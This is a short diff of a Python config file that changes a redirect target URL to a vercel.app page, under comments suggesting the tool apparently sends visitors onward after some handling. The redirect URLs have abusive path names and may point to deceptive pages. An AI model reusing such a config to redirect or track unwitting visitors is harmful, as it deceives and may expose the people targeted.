@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://revengeistotallyaghost.rf.gd/youarethelapdopofyourmombitch" # Link to the webpage to redirect to 
+        "page": "https://wantedperson-q8rw32xoy-lyroxstreaming.vercel.app/api/stupidbadass.html" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
